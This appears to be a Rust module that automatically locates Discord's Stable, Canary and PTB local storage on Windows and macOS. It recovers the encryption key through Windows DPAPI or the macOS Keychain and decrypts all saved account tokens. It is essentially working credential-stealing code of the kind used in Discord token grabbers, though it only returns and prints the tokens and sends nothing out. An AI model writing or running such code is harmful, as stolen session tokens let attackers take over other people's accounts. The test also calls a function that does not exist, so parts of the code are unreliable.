use anyhow::{Context, Result};
use base64::{engine::general_purpose::STANDARD as BASE64, Engine};
use regex::Regex;
use std::fs;
use std::path::PathBuf;

// Windows-specific imports
#[cfg(target_os = "windows")]
use windows::Win32::Security::Cryptography::{CryptUnprotectData, CRYPT_INTEGER_BLOB};

/// Discord client type
#[derive(Debug)]
enum DiscordClient {
    Stable,
    Canary,
    Ptb,
}

impl DiscordClient {
    fn path(&self) -> &str {
        match self {
            DiscordClient::Stable => "discord",
            DiscordClient::Canary => "discordcanary",
            DiscordClient::Ptb => "discordptb",
        }
    }
}

/// Auto-detect and extract Discord tokens (returns all unique tokens found)
pub fn extract_tokens() -> Result<Vec<String>> {
    println!("Starting token extraction...");
    let mut tokens = std::collections::HashSet::new();
    let clients = vec![
        DiscordClient::Stable,
        DiscordClient::Canary,
        DiscordClient::Ptb,
    ];

    for client in clients {
        println!("Checking client: {:?}", client);
        if let Ok(client_tokens) = try_extract_from_client(&client) {
            println!("Found {} tokens in {:?}", client_tokens.len(), client);
            for token in client_tokens {
                tokens.insert(token);
            }
        } else {
             println!("Failed to extract from {:?}", client);
        }
    }
    
    println!("Total unique tokens found: {}", tokens.len());

    if tokens.is_empty() {
        anyhow::bail!("Could not find tokens in any Discord client")
    }

    Ok(tokens.into_iter().collect())
}

#[cfg(target_os = "windows")]
fn try_extract_from_client(client: &DiscordClient) -> Result<Vec<String>> {
    // Get APPDATA path
    let appdata = std::env::var("APPDATA").context("Could not get APPDATA environment variable")?;

    // Build Discord path
    let discord_path = PathBuf::from(appdata).join(client.path());

    // Read Local State file to get encryption key
    let local_state_path = discord_path.join("Local State");
    let local_state_content =
        fs::read_to_string(&local_state_path).context("Could not read Local State file")?;

    // Parse JSON to get encryption key
    let local_state: serde_json::Value =
        serde_json::from_str(&local_state_content).context("Could not parse Local State JSON")?;

    let encrypted_key = local_state["os_crypt"]["encrypted_key"]
        .as_str()
        .context("Could not find encrypted_key")?;

    // Base64 decode
    let encrypted_key_bytes = BASE64
        .decode(encrypted_key)
        .context("Could not decode encrypted_key")?;

    // Remove "DPAPI" prefix (first 5 bytes)
    let encrypted_key_bytes = &encrypted_key_bytes[5..];

    // Use Windows DPAPI to decrypt master key
    let master_key = decrypt_with_dpapi(encrypted_key_bytes)?;

    // Search for tokens in LevelDB
    let leveldb_path = discord_path.join("Local Storage").join("leveldb");

    if !leveldb_path.exists() {
        anyhow::bail!("LevelDB path does not exist");
    }

    let mut tokens = Vec::new();

    // Read all .ldb and .log files
    for entry in fs::read_dir(&leveldb_path)? {
        let entry = entry?;
        let path = entry.path();

        if let Some(ext) = path.extension() {
            if ext == "ldb" || ext == "log" {
                if let Ok(content) = fs::read(&path) {
                    // Search for all token patterns
                    let found_tokens = find_and_decrypt_tokens(&content, &master_key);
                    tokens.extend(found_tokens);
                }
            }
        }
    }
    
    Ok(tokens)
}

#[cfg(target_os = "windows")]
fn decrypt_with_dpapi(data: &[u8]) -> Result<Vec<u8>> {
    use std::ptr;

    unsafe {
        let mut input_blob = CRYPT_INTEGER_BLOB {
            cbData: data.len() as u32,
            pbData: data.as_ptr() as *mut u8,
        };

        let mut output_blob = CRYPT_INTEGER_BLOB {
            cbData: 0,
            pbData: ptr::null_mut(),
        };

        let result =
            CryptUnprotectData(&mut input_blob, None, None, None, None, 0, &mut output_blob);

        if result.is_err() {
            anyhow::bail!("DPAPI decryption failed");
        }

        // Copy decrypted data
        let decrypted =
            std::slice::from_raw_parts(output_blob.pbData, output_blob.cbData as usize).to_vec();

        Ok(decrypted)
    }
}

/// macOS: Get Discord data path
#[cfg(target_os = "macos")]
fn get_macos_discord_path(client: &DiscordClient) -> Result<PathBuf> {
    let home = std::env::var("HOME").context("Could not get HOME environment variable")?;
    Ok(PathBuf::from(home)
        .join("Library")
        .join("Application Support")
        .join(client.path()))
}

/// macOS: Get master key from Keychain using security CLI
/// Discord (Electron/Chromium) stores the encryption key in the Keychain
/// under the service name matching the app's bundle identifier
#[cfg(target_os = "macos")]
fn get_macos_master_key(client: &DiscordClient) -> Result<Vec<u8>> {
    use std::process::Command;
    
    // Chromium-based apps (including Electron/Discord) use "Chrome Safe Storage" or similar
    // Discord uses its app name as the service name
    let service_names = match client {
        DiscordClient::Stable => vec!["Discord Safe Storage", "Discord"],
        DiscordClient::Canary => vec!["Discord Canary Safe Storage", "Discord Canary"],
        DiscordClient::Ptb => vec!["Discord PTB Safe Storage", "Discord PTB"],
    };
    
    for service in service_names {
        println!("Trying Keychain service: {}", service);
        let output = Command::new("security")
            .args(["find-generic-password", "-s", service, "-w"])
            .output();
        
        match output {
            Ok(out) if out.status.success() => {
                let password = String::from_utf8_lossy(&out.stdout).trim().to_string();
                if !password.is_empty() {
                    println!("Found Keychain password for service: {}", service);
                    // Derive AES key from password using PBKDF2
                    // Chromium uses PBKDF2-HMAC-SHA1 with salt "saltysalt" and 1003 iterations
                    return derive_key_from_password(&password);
                }
            }
            Ok(out) => {
                let stderr = String::from_utf8_lossy(&out.stderr);
                println!("Keychain lookup failed for {}: {}", service, stderr.trim());
            }
            Err(e) => {
                println!("Failed to execute security command: {}", e);
            }
        }
    }
    
    anyhow::bail!("Could not find Discord encryption key in Keychain")
}

/// Derive AES-128 key from Keychain password using PBKDF2
/// Chromium uses: PBKDF2-HMAC-SHA1, salt="saltysalt", iterations=1003, key_len=16
#[cfg(target_os = "macos")]
fn derive_key_from_password(password: &str) -> Result<Vec<u8>> {
    use std::num::NonZeroU32;
    
    // Chromium's constants for macOS
    const SALT: &[u8] = b"saltysalt";
    const ITERATIONS: u32 = 1003;
    const KEY_LEN: usize = 16; // AES-128
    
    let mut key = vec![0u8; KEY_LEN];
    
    // Use ring or implement PBKDF2 manually
    // For minimal implementation, we'll use a simple approach
    pbkdf2_sha1(password.as_bytes(), SALT, ITERATIONS, &mut key)?;
    
    Ok(key)
}

/// Simple PBKDF2-HMAC-SHA1 implementation
#[cfg(target_os = "macos")]
fn pbkdf2_sha1(password: &[u8], salt: &[u8], iterations: u32, output: &mut [u8]) -> Result<()> {
    use std::io::Write;
    
    // Use the system's OpenSSL via Command for PBKDF2
    // This is a workaround to avoid adding heavy crypto dependencies
    let password_b64 = BASE64.encode(password);
    let salt_hex = salt.iter().map(|b| format!("{:02x}", b)).collect::<String>();
    
    let output_result = std::process::Command::new("openssl")
        .args([
            "kdf",
            "-keylen", &output.len().to_string(),
            "-kdfopt", &format!("digest:SHA1"),
            "-kdfopt", &format!("pass:{}", String::from_utf8_lossy(password)),
            "-kdfopt", &format!("salt:{}", salt_hex),
            "-kdfopt", &format!("iter:{}", iterations),
            "PBKDF2",
        ])
        .output();
    
    match output_result {
        Ok(result) if result.status.success() => {
            let hex_output = String::from_utf8_lossy(&result.stdout).trim().to_string();
            // Parse hex output
            let bytes: Vec<u8> = (0..hex_output.len())
                .step_by(2)
                .filter_map(|i| u8::from_str_radix(&hex_output[i..i+2], 16).ok())
                .collect();
            if bytes.len() >= output.len() {
                output.copy_from_slice(&bytes[..output.len()]);
                return Ok(());
            }
        }
        _ => {}
    }
    
    // Fallback: Use a pure Rust PBKDF2 implementation
    // PBKDF2-HMAC-SHA1 manual implementation
    pbkdf2_sha1_fallback(password, salt, iterations, output)
}

/// Pure Rust PBKDF2-HMAC-SHA1 fallback implementation
#[cfg(target_os = "macos")]
fn pbkdf2_sha1_fallback(password: &[u8], salt: &[u8], iterations: u32, output: &mut [u8]) -> Result<()> {
    // Simple HMAC-SHA1 implementation using system command as last resort
    // For a production build, you'd want to use a proper crypto library
    
    // Try using openssl dgst for HMAC
    fn hmac_sha1(key: &[u8], data: &[u8]) -> Result<[u8; 20]> {
        use std::io::Write;
        use std::process::{Command, Stdio};
        
        let key_hex = key.iter().map(|b| format!("{:02x}", b)).collect::<String>();
        
        let mut child = Command::new("openssl")
            .args(["dgst", "-sha1", "-mac", "HMAC", "-macopt", &format!("hexkey:{}", key_hex)])
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .spawn()?;
        
        if let Some(mut stdin) = child.stdin.take() {
            stdin.write_all(data)?;
        }
        
        let output = child.wait_with_output()?;
        let output_str = String::from_utf8_lossy(&output.stdout);
        
        // Parse "HMAC-SHA1(stdin)= <hex>" format
        let hex = output_str.split('=').last().unwrap_or("").trim();
        let mut result = [0u8; 20];
        for (i, chunk) in hex.as_bytes().chunks(2).enumerate() {
            if i >= 20 { break; }
            if let Ok(byte) = u8::from_str_radix(std::str::from_utf8(chunk).unwrap_or("00"), 16) {
                result[i] = byte;
            }
        }
        Ok(result)
    }
    
    let mut block_num = 1u32;
    let mut offset = 0;
    
    while offset < output.len() {
        // U_1 = PRF(Password, Salt || INT_32_BE(i))
        let mut salt_block = salt.to_vec();
        salt_block.extend_from_slice(&block_num.to_be_bytes());
        
        let mut u = hmac_sha1(password, &salt_block)?;
        let mut result = u;
        
        // U_2 to U_c
        for _ in 1..iterations {
            u = hmac_sha1(password, &u)?;
            for (r, x) in result.iter_mut().zip(u.iter()) {
                *r ^= x;
            }
        }
        
        let remaining = output.len() - offset;
        let to_copy = remaining.min(20);
        output[offset..offset + to_copy].copy_from_slice(&result[..to_copy]);
        
        offset += 20;
        block_num += 1;
    }
    
    Ok(())
}

#[cfg(target_os = "macos")]
fn try_extract_from_client(client: &DiscordClient) -> Result<Vec<String>> {
    let discord_path = get_macos_discord_path(client)?;
    println!("Discord path: {:?}", discord_path);
    
    if !discord_path.exists() {
        anyhow::bail!("Discord path does not exist: {:?}", discord_path);
    }
    
    // Get master key from Keychain
    let master_key = get_macos_master_key(client)?;
    println!("Got master key ({} bytes)", master_key.len());
    
    // Search for tokens in LevelDB
    let leveldb_path = discord_path.join("Local Storage").join("leveldb");
    
    if !leveldb_path.exists() {
        anyhow::bail!("LevelDB path does not exist: {:?}", leveldb_path);
    }
    
    let mut tokens = Vec::new();
    
    // Read all .ldb and .log files
    for entry in fs::read_dir(&leveldb_path)? {
        let entry = entry?;
        let path = entry.path();
        
        if let Some(ext) = path.extension() {
            if ext == "ldb" || ext == "log" {
                if let Ok(content) = fs::read(&path) {
                    // macOS uses AES-128-CBC with "v10" prefix, not AES-256-GCM
                    let found_tokens = find_and_decrypt_tokens_macos(&content, &master_key);
                    tokens.extend(found_tokens);
                }
            }
        }
    }
    
    Ok(tokens)
}

/// Find and decrypt tokens using macOS Chromium encryption (AES-128-CBC)
#[cfg(target_os = "macos")]
fn find_and_decrypt_tokens_macos(data: &[u8], master_key: &[u8]) -> Vec<String> {
    let mut tokens = Vec::new();
    let content = String::from_utf8_lossy(data);
    
    // Pattern for encrypted tokens: v10 or v11 prefix followed by encrypted data
    let re = match Regex::new(r"dQw4w9WgXcQ:([A-Za-z0-9+/=]+)") {
        Ok(re) => re,
        Err(_) => return tokens,
    };
    
    for cap in re.captures_iter(&content) {
        if let Some(encrypted_token) = cap.get(1) {
            if let Ok(encrypted_bytes) = BASE64.decode(encrypted_token.as_str()) {
                // Try macOS decryption (v10 = AES-128-CBC)
                if let Ok(token) = decrypt_token_macos(&encrypted_bytes, master_key) {
                    tokens.push(token);
                }
            }
        }
    }
    
    tokens
}

/// Decrypt token using macOS Chromium encryption
/// v10: AES-128-CBC with IV = 16 spaces
#[cfg(target_os = "macos")]
fn decrypt_token_macos(encrypted_data: &[u8], key: &[u8]) -> Result<String> {
    if encrypted_data.len() < 3 {
        anyhow::bail!("Encrypted data too short");
    }
    
    // Check for "v10" or "v11" prefix
    let version = &encrypted_data[..3];
    if version != b"v10" && version != b"v11" {
        // Try standard AES-256-GCM decryption (fallback)
        return decrypt_token(encrypted_data, key);
    }
    
    let ciphertext = &encrypted_data[3..];
    
    // v10/v11 uses AES-128-CBC with IV = 16 spaces (0x20)
    let iv = [0x20u8; 16];
    
    // Use openssl for AES-128-CBC decryption
    decrypt_aes_128_cbc(ciphertext, key, &iv)
}

/// AES-128-CBC decryption using openssl command
#[cfg(target_os = "macos")]
fn decrypt_aes_128_cbc(ciphertext: &[u8], key: &[u8], iv: &[u8]) -> Result<String> {
    use std::io::Write;
    use std::process::{Command, Stdio};
    
    let key_hex = key.iter().map(|b| format!("{:02x}", b)).collect::<String>();
    let iv_hex = iv.iter().map(|b| format!("{:02x}", b)).collect::<String>();
    
    let mut child = Command::new("openssl")
        .args([
            "enc", "-d", "-aes-128-cbc",
            "-K", &key_hex,
            "-iv", &iv_hex,
            "-nopad",
        ])
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .context("Failed to spawn openssl")?;
    
    if let Some(mut stdin) = child.stdin.take() {
        stdin.write_all(ciphertext)?;
    }
    
    let output = child.wait_with_output()?;
    
    if !output.status.success() {
        anyhow::bail!("OpenSSL decryption failed");
    }
    
    // Remove PKCS7 padding
    let mut decrypted = output.stdout;
    if let Some(&last) = decrypted.last() {
        let pad_len = last as usize;
        if pad_len > 0 && pad_len <= 16 && decrypted.len() >= pad_len {
            decrypted.truncate(decrypted.len() - pad_len);
        }
    }
    
    String::from_utf8(decrypted).context("Decrypted data is not valid UTF-8")
}

#[cfg(not(any(target_os = "windows", target_os = "macos")))]
fn try_extract_from_client(_client: &DiscordClient) -> Result<Vec<String>> {
    anyhow::bail!("Token extraction is only supported on Windows and macOS")
}

fn find_and_decrypt_tokens(data: &[u8], master_key: &[u8]) -> Vec<String> {
    let mut tokens = Vec::new();
    
    // Convert data to string for regex matching (lossy but simple)
    let content = String::from_utf8_lossy(data);

    // Use regex to find encrypted tokens
    // Pattern: dQw4w9WgXcQ:([Base64])
    let re = match Regex::new(r"dQw4w9WgXcQ:([A-Za-z0-9+/=]+)") {
        Ok(re) => re,
        Err(_) => return tokens,
    };

    for cap in re.captures_iter(&content) {
        if let Some(encrypted_token) = cap.get(1) {
            // Base64 decode
            if let Ok(encrypted_bytes) = BASE64.decode(encrypted_token.as_str()) {
                // Decrypt token
                if let Ok(token) = decrypt_token(&encrypted_bytes, master_key) {
                    tokens.push(token);
                }
            }
        }
    }

    tokens
}

fn decrypt_token(encrypted_data: &[u8], key: &[u8]) -> Result<String> {
    use aes_gcm::{
        aead::{Aead, KeyInit},
        Aes256Gcm, Nonce,
    };

    // AES-256-GCM decryption
    // First 3 bytes are version identifier "v10"
    if encrypted_data.len() < 15 {
        anyhow::bail!("Encrypted data is too short");
    }

    // Skip version identifier
    let encrypted_data = &encrypted_data[3..];

    // First 12 bytes are nonce/iv
    let nonce_bytes = &encrypted_data[..12];
    let ciphertext = &encrypted_data[12..];

    // Create cipher
    let cipher = Aes256Gcm::new_from_slice(key).map_err(|_| anyhow::anyhow!("Could not create AES cipher"))?;

    let nonce = Nonce::from_slice(nonce_bytes);

    // Decrypt
    let decrypted = cipher
        .decrypt(nonce, ciphertext)
        .map_err(|_| anyhow::anyhow!("AES decryption failed"))?;

    // Convert to string
    String::from_utf8(decrypted).context("Decrypted data is not valid UTF-8")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    #[ignore] // Only run when Discord is installed
    fn test_extract_token() {
        let result = extract_token();
        match result {
            Ok(token) => println!("Extracted token: {}", token),
            Err(e) => println!("Error: {}", e),
        }
    }
}
